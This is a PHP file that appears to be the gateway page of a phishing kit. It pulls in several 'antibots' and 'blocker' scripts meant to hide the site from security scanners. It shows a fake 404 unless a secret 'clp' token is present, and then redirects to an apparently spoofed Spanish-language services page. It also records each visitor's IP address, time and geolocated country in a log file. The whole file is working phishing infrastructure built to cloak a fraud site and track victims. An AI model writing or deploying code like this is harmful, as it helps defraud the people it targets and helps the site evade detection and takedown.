<?php 
include "./boots/antibots1.php";
include "./boots/antibots2.php";
include "./boots/antibots3.php";
include "./boots/antibots4.php";
include "./boots/antibots5.php";
include "./boots/antibots6.php";
include "./boots/blocker.php";


?>
<?php
if(isset($_GET["clp"])&&$_GET["clp"]=="327598322") {
header("Location: Productos_y Servicios_de_Cor.php");
}else{header('HTTP/1.0 404 Not Found');exit();}
?>
<?php 
date_default_timezone_set('GMT');
$TIME = date("d-m-Y H:i:s"); 
$PP = getenv("REMOTE_ADDR");
$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$PP");
$COUNTRY = $J7->geoplugin_countryName ;
$ip = getenv("REMOTE_ADDR");
$file = fopen("visit.txt","a");fwrite($file,$ip." - ".$TIME." - " . $COUNTRY ."\n") ;
?>
